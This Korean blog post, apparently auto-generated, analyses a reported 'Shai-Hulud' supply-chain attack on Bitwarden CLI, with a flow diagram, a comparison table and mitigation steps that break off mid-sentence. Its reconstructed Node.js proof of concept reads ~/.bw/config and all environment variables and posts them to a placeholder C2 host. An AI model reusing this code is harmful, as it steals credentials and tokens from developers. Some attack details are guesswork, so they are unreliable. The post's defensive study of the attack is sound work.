---
title: "Bitwarden CLI 백도어: Shai-Hulud 공급망 공격 분석"
date: 2026-04-29T01:07:13+09:00
draft: false
categories: ["보안"]
tags: ["보안"]
author: "Intelligence Agent"
---

## 서론

새벽 2시, 당신의 모니터 앞에서 자동화 스크립트가 정상적으로 완료되었다는 알림이 뜹니다. 패스워드 매니저인 Bitwarden의 CLI(Command Line Interface) 도구를 사용해 민간한 인증 정보를 안전하게 관리하고 있다고 믿고 있었죠. 하지만 이 안도감은 찰나입니다. 방금 실행한 그 `npm install` 명령어 혹은 `pip install` 과정에서, 당신의 시스템 뒤쪽으로 은밀하게 문이 열렸을 수도 있기 때문입니다.

최근 보안 업계를 강타한 'Shai-Hulud' 캠페인의 세 번째 공격 대상으로 바로 이 Bitwarden CLI가 지목되었습니다. 이번 사건은 단순한 제로데이 취약점이 아닙니다. 우리가 매일같이 신뢰하며 사용하는 오픈소스 생태계의 '공급망(Supply Chain)' 자체가 겨냥받았습니다. 공격자는 정상적인 패키지처럼 위장한 악성 코드를 배포하여, 수많은 개발자와 시스템 관리자의 환경에 침투했습니다. 왜 이 공격이 위험한가요? 방화벽이나 EDR(엔드포인트 탐지 및 대응) 시스템조차 "정상적인 사용자가 설치한 신뢰할 수 있는 도구"의 실행을 막지 못하기 때문입니다. 오늘 우리는 Shai-Hulud이 Bitwarden CLI를 어떻게 탈취했는지, 그 기술적 원리를 파헤치고 이를 방어하기 위한 실전 가이드를 다룰 것입니다.

## 공격 메커니즘: Shai-Hulud의 침투 경로

Shai-Hulud 캠페인은 반복되는 패턴을 가진 공급망 공격입니다. 공격자는 주로 오픈소스 레지스트리(npm, PyPI 등)를 노립니다. 이번 Bitwarden CLI 사건의 핵심은 **'타이포스쿼팅(Typosquatting)'** 혹은 **'의존성 혼동(Confusion Dependency)'** 기법을 활용하여, 사용자가 실수로 혹은 자동화 스크립트를 통해 악성 패키지를 다운로드하도록 유도한 점입니다.

이 공격의 기술적 깊이는 단순히 악성 파일을 유포하는 것에 그치지 않습니다. 공격자는 패키지 설치 직후, 혹은 특정 명령어 실행 시점에 트리거되는 백도어를 심었습니다. 이 백도어는 사용자의 시스템 정보, 환경 변수, 그리고 무엇보다 중요한 크리덴셜(Credential) 정보를 수집하여 원격 서버(C2 Server)로 전송합니다.

다음은 이러한 공급망 공격이 진행되는 전체적인 흐름도입니다.

```javascript
graph LR
    A[공격자] --> B[악성 패키지 생성]
    B --> C[공개 레지스트리 업로드]
    C --> D[사용자 의존성 설치 요청]
    D --> E[악성 패키지 다운로드]
    E --> F[백도어 코드 실행]
    F --> G[시스템 정보 수집]
    F --> H[민감 데이터 탈취]
    G --> I[C2 서버 전송]
    H --> I
```

위 다이어그램에서 볼 수 있듯이, 사용자는 자신이 정상적인 Bitwarden CLI를 설치한다고 생각하지만, 실제로는 악성 코드가 포함된 패키지를 실행하게 됩니다. 이 과정에서 네트워크 트래픽은 평소와 유사하게 보이며, 파일 시그니처 또한 우회할 수 있도록 작성되었을 가능성이 높습니다.

## 악성 코드 분석: 백도어의 실체

방어를 위해서는 적의 칼날을 이해해야 합니다. Shai-Hulud 캠페인에서 사용된 백도어 코드는 일반적으로 패키지의 `index.js`, `setup.py`, 혹은 `post-install` 스크립트 내부에 숨어 있습니다.

다음은 학습 및 방어 목적으로 재구성한 개념 증명(PoC) 코드입니다. 실제 공격 코드는 난독화(Obfuscation)되어 있겠지만, 그 핵심 로직은 다음과 같이 동작합니다.

```javascript
// 악성 패키지의 핵심 로직 예시 (Node.js 환경 가정)
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

function exfiltrateData(data) {
    const postData = JSON.stringify(data);

    const options = {
        hostname: 'malicious-c2-server[.]com', // 실제 공격자의 C2 서버
        port: 443,
        path: '/api/collect',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, (res) => {
        // 응답 무시 및 로깅 남기지 않음
        res.on('data', () => {});
    });

    req.on('error', (e) => {
        // 에러 발생 시 조용히 종료 (사용자에게 알림 없음)
    });

    req.write(postData);
    req.end();
}

function collectSystemInfo() {
    return {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        userInfo: os.userInfo(),
        env: process.env // 환경 변수 내의 API 키, 토큰 등 포함 위험
    };
}

// 패키지 설치 혹은 실행 시 즉시 실행되는 로직
console.log('Bitwarden CLI initializing...'); // 위장 메시지
const stolenData = collectSystemInfo();

// Bitwarden 관련 설정 파일이나 로그를 탐색하는 로직 (가상)
exec('cat ~/.bw/config 2>/dev/null', (error, stdout, stderr) => {
    if (stdout) {
        stolenData.bwConfig = stdout;
    }
    // 데이터 전송
    exfiltrateData(stolenData);
});

// 정상적인 CLI 기능 수행하는 것처럼 위장
module.exports = {
    login: () => console.log('Mock login function'),
    sync: () => console.log('Mock sync function')
};
```

이 코드는 사용자가 패키지를 `require` 하거나 설치할 때 실행됩니다. `process.env`를 통해 시스템의 환경 변수를 긁어오는데, 여기에는 AWS 키, DB 접속 정보, 그리고 Bitwarden 세션 토큰과 같은 고급 정보가 포함될 수 있습니다. 공격자는 이 정보를 암호화하지 않거나 간단히 인코딩하여 C2 서버로 날립니다.

## 정상 패키지 vs 악성 패키지 식별

현장에서 침투 테스터나 보안 담당자가 의심스러운 패키지를 식별할 때 확인해야 할 핵심적인 차이점은 다음과 같습니다.

| 비교 항목 | 정상 Bitwarden CLI 패키지 | Shai-Hulud 악성 패키지 |
| :--- | :--- | :--- |
| **배포자(Publisher)** | 공식 Bitwarden 팀 (Verified) | 가짜 계정 혹은 탈취된 계정 (Unverified) |
| **다운로드 수** | 수백만 회 (Weekly) | 매우 낮음 또는 급격한 증가 |
| **의존성(Dependencies)** | 최소한의 필수 라이브러리만 존재 | 불필요하거나 의심스러운 외부 라이브러리 포함 |
| **설치 스크립트** | 없거나 투명한 빌드 과정 | `postinstall` 스크립트 존재 및 난독화된 코드 |
| **네트워크 행동** | 공식 API 서버(bitwarden.com 등)만 통신 | 알 수 없는 외부 IP/도메인으로 아웃바운드 연결 시도 |

## 완화 및 대응 가이드 (Step-by-Step)

이러한 공급망 공격으로부터 시스템을 보호하기 위해 다음과 같은 단계별 대응 전략을 수립해야 합니다.

### 1. 패키지 소스 검증 (Package Source Verification)

절대 모호한 블로그나 비공식 저장소의 설치 명령어를 맹신하지 마십시오. 반드시 공식 문서(npmjs.com, pypi.org 등)를 확인하고, **"Verified Publisher"** 배지가 있는지 확인하세요.

### 2. 의존성 관리 도구 활용 (Dependency Management)

`npm audit`, `

---

**출처**: [https://news.google.com/rss/articles/CBMif0FVX3lxTE1Lc2U5SHdfQzItOXdGdGVZV3Y5U09VdUpnYWtpdVlNSS1BMnh5cDE4R0oyRVN2RzFnWklFWjhhRE5mSkJPT2VpTS1SZ3NWVGlUeElYTmFWUXliY1ltVGVLLVBGY1pZVmxEYzlJUWlXaEVEVElZWkhCSDVxaHJFejA?oc=5](https://news.google.com/rss/articles/CBMif0FVX3lxTE1Lc2U5SHdfQzItOXdGdGVZV3Y5U09VdUpnYWtpdVlNSS1BMnh5cDE4R0oyRVN2RzFnWklFWjhhRE5mSkJPT2VpTS1SZ3NWVGlUeElYTmFWUXliY1ltVGVLLVBGY1pZVmxEYzlJUWlXaEVEVElZWkhCSDVxaHJFejA?oc=5)